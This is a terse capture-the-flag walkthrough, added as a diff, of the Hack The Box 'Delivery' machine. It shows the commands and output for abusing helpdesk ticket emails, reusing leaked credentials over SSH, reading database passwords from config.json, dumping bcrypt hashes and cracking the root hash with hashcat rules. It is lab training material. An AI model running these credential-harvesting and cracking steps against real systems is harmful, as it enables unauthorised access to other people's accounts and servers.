@@ -1,0 +1,289 @@
+Machine-Name  :  Delivery
+IP-Address    :  10.129.110.56
+
+Command-Line: sudo nmap -A 10.129.110.56
+Result:
+    Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-25 17:31 EST
+    Nmap scan report for 10.129.110.56
+    Host is up (0.053s latency).
+    Not shown: 998 closed ports
+    PORT   STATE SERVICE VERSION
+    22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+    | ssh-hostkey:
+    |   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)
+    |   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)
+    |_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)
+    80/tcp open  http    nginx 1.14.2
+    |_http-server-header: nginx/1.14.2
+    |_http-title: Welcome
+    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+    TCP/IP fingerprint:
+    OS:SCAN(V=7.91%E=4%D=2/25%OT=22%CT=1%CU=37871%PV=Y%DS=2%DC=T%G=Y%TM=6038255
+    OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=110%TI=Z%CI=Z%II=I%TS=A)OPS
+    OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
+    OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
+    OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+    OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+    OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+    OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+    OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+    OS:=S)
+
+    Network Distance: 2 hops
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+    TRACEROUTE (using port 993/tcp)
+    HOP RTT      ADDRESS
+    1   54.65 ms 10.10.14.1
+    2   55.28 ms 10.129.110.56
+
+    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 21.50 seconds
+
+
+Browser: http://helpdesk.delivery.htb
+Notes: Created a "ticket".
+Email: uk47@uk47.com
+Name: uk47 uk47
+Result:
+    uk47 uk47,
+
+    You may check the status of your ticket, by navigating to the Check Status page using ticket id: 6093998.
+
+    If you want to add more information to your ticket, just email 6093998@delivery.htb.
+
+    Thanks,
+
+    Support Team
+
+
+Browser: http://delivery.htb/#contact-us
+Result:
+For unregistered users, please use our `HelpDesk` to get in touch with our team. Once you have an @delivery.htb email address, you'll be able to have access to our `MatterMost` server.
+
+Notes: Clicked on MatterMost and navigated to the signup page.
+Browser: http://delivery.htb:8065/signup_email
+Email: 6093998@delivery.htb
+Pass:  Password1234!
+
+Notes: MatterMost has sent a verification email to the ticket.
+Result:
+    ---- Registration Successful ---- Please activate your email by going to: http://delivery.htb:8065/do_verify_email?token=qy68zu7k1qpdinfkwz5693br5xjp8fw5w7ew8kpwnbsem4nhceq58megaoba1k8p&email=6093998%40delivery.htb ) --------------------- You can sign in from: --------------------- Mattermost lets you share messages and files from your PC or phone, with instant search and archiving. For the best experience, download the apps for PC, Mac, iOS and Android from: https://mattermost.com/download/#mattermostApps ( https://mattermost.com/download/#mattermostApps
+
+
+Notes: Opened link and signed in with email and password.
+Result:
+    root:
+    @developers Please update theme to the OSTicket before we go live.  Credentials to the server are maildeliverer:Youve_G0t_Mail!
+
+    Also please create a program to help us stop re-using the same passwords everywhere.... Especially those that are a variant of "PleaseSubscribe!"
+
+    root:
+    PleaseSubscribe! may not be in RockYou but if any hacker manages to get our hashes, they can use hashcat rules to easily crack all variations of common words or phrases.
+
+
+Command-Line: ssh maildeliverer@delivery.htb
+Password: Youve_G0t_Mail!
+Result:
+    *** REVERSE SHELL ***
+    *** USER ACCESS ***
+
+
+maildeliverer@Delivery:~$ cat user.txt
+Result: 438f8815c81e20d8670227b8add5ed87
+    *** USER OWNED ***
+
+
+
+Attempting root access...
+
+
+
+maildeliverer@Delivery:~$ sudo -l
+Result:
+    We trust you have received the usual lecture from the local System
+    Administrator. It usually boils down to these three things:
+
+        #1) Respect the privacy of others.
+        #2) Think before you type.
+        #3) With great power comes great responsibility.
+
+    [sudo] password for maildeliverer:
+    Sorry, user maildeliverer may not run sudo on Delivery.
+
+
+Notes: User "maildeliverer" does not have root privileges.
+
+linpeas.sh:
+
+    OS: Linux version 4.19.0-13-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.160-2 (2020-11-28)
+
+    Sudo version 1.8.27
+
+    Architecture:        x86_64
+    CPU op-mode(s):      32-bit, 64-bit
+    Byte Order:          Little Endian
+
+
+Command-Line: ssh root@delivery.htb
+Password: PleaseSubscribe!
+Result: FAILED
+
+maildeliverer@delivery.htb:~$ cd /opt/mattermost/config
+maildeliverer@delivery.htb:/opt/mattermost/config$ cat config.json
+Result:
+    SqlSettings": {
+            "DriverName": "mysql",
+            "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
+            "DataSourceReplicas": [],
+            "DataSourceSearchReplicas": [],
+            "MaxIdleConns": 20,
+            "ConnMaxLifetimeMilliseconds": 3600000,
+            "MaxOpenConns": 300,
+            "Trace": false,
+            "AtRestEncryptKey": "n5uax3d4f919obtsp1pw1k5xetq1enez",
+            "QueryTimeout": 30,
+            "DisableDatabaseSearch": false
+
+SQL-Credentials-Found: mmuser:Crack_The_MM_Admin_PW
+
+maildeliverer@delivery.htb:/opt/mattermost/config$ mysql -u mmuser -p Crack_The_MM_Admin_PW
+Result:
+    *** MYSQL ACCESS ***
+
+MariaDB [(none)]> show databases;
+    +--------------------+
+    | Database           |
+    +--------------------+
+    | information_schema |
+    | mattermost         |
+    +--------------------+
+    2 rows in set (0.001 sec)
+
+MariaDB [(none)]> use mattermost;
+    Reading table information for completion of table and column names
+    You can turn off this feature to get a quicker startup with -A
+
+    Database changed
+    MariaDB [mattermost]> show tables;
+    +------------------------+
+    | Tables_in_mattermost   |
+    +------------------------+
+    | Audits                 |
+    | Bots                   |
+    | ChannelMemberHistory   |
+    | ChannelMembers         |
+    | Channels               |
+    | ClusterDiscovery       |
+    | CommandWebhooks        |
+    | Commands               |
+    | Compliances            |
+    | Emoji                  |
+    | FileInfo               |
+    | GroupChannels          |
+    | GroupMembers           |
+    | GroupTeams             |
+    | IncomingWebhooks       |
+    | Jobs                   |
+    | Licenses               |
+    | LinkMetadata           |
+    | OAuthAccessData        |
+    | OAuthApps              |
+    | OAuthAuthData          |
+    | OutgoingWebhooks       |
+    | PluginKeyValueStore    |
+    | Posts                  |
+    | Preferences            |
+    | ProductNoticeViewState |
+    | PublicChannels         |
+    | Reactions              |
+    | Roles                  |
+    | Schemes                |
+    | Sessions               |
+    | SidebarCategories      |
+    | SidebarChannels        |
+    | Status                 |
+    | Systems                |
+    | TeamMembers            |
+    | Teams                  |
+    | TermsOfService         |
+    | ThreadMemberships      |
+    | Threads                |
+    | Tokens                 |
+    | UploadSessions         |
+    | UserAccessTokens       |
+    | UserGroups             |
+    | UserTermsOfService     |
+    | Users                  |
+    +------------------------+
+    46 rows in set (0.001 sec)
+
+MariaDB [mattermost]> select * from Users;
+Result:
+    +----------------------------+---------------+---------------+----------+----------------------------------+--------------------------------------------------------------+----------+-------------+-------------------------+---------------+----------+--------------------+----------+----------+--------------------------+----------------+-------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------+-------------------+----------------+--------+------------------------------------------------------------------------------------------+-----------+-----------+
+    | Id                         | CreateAt      | UpdateAt      | DeleteAt | Username                         | Password                                                     | AuthData | AuthService | Email                   | EmailVerified | Nickname | FirstName          | LastName | Position | Roles                    | AllowMarketing | Props | NotifyProps                                                                                                                                                                  | LastPasswordUpdate | LastPictureUpdate | FailedAttempts | Locale | Timezone                                                                                 | MfaActive | MfaSecret |
+    +----------------------------+---------------+---------------+----------+----------------------------------+--------------------------------------------------------------+----------+-------------+-------------------------+---------------+----------+--------------------+----------+----------+--------------------------+----------------+-------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------+-------------------+----------------+--------+------------------------------------------------------------------------------------------+-----------+-----------+
+
+
+MariaDB [mattermost]> select username , password from Users;
++----------------------------------+--------------------------------------------------------------+
+| username                         | password                                                     |
++----------------------------------+--------------------------------------------------------------+
+| surveybot                        |                                                              |
+| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |
+| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |
+| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |
+| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |
+| channelexport                    |                                                              |
+| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |
++----------------------------------+--------------------------------------------------------------+
+7 rows in set (0.001 sec)
+
+
+Notes: Found root hash.
+
+HashType: bcrypt/blowfish
+
+Command-Line: nano hash
+Contents: $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO
+
+Command-Line: nano hash_pass
+Result: PleaseSubscribe!
+
+Command-Line: hashcat -a 0 -m 3200 hash hash_pass -r /usr/share/hashcat/rules/best64.rule
+Result:
+    $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21
+
+    Session..........: hashcat
+    Status...........: Cracked
+    Hash.Name........: bcrypt $2*$, Blowfish (Unix)
+    Hash.Target......: $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v...JwgjjO
+    Time.Started.....: Sat Feb 27 08:49:22 2021 (1 sec)
+    Time.Estimated...: Sat Feb 27 08:49:23 2021 (0 secs)
+    Guess.Base.......: File (hash_pass)
+    Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
+    Guess.Queue......: 1/1 (100.00%)
+    Speed.#1.........:       22 H/s (1.38ms) @ Accel:4 Loops:32 Thr:1 Vec:8
+    Recovered........: 1/1 (100.00%) Digests
+    Progress.........: 21/77 (27.27%)
+    Rejected.........: 0/21 (0.00%)
+    Restore.Point....: 0/1 (0.00%)
+    Restore.Sub.#1...: Salt:0 Amplifier:20-21 Iteration:992-1024
+    Candidates.#1....: PleaseSubscribe!21 -> PleaseSubscribe!21
+
+    Started: Sat Feb 27 08:49:17 2021
+    Stopped: Sat Feb 27 08:49:25 2021
+
+
+maildeliverer@delivery.htb:/$ su root
+Password: PleaseSubscribe!21
+Result:
+    *** ROOT ACCESS ***
+
+
+root@delivery.htb:/# cat /root/root.txt
+Result: 29ebe7f56024dbebe278350c29d7d88d
+    *** ROOT OWNED ***
+
+
+      *** FINISHED ***
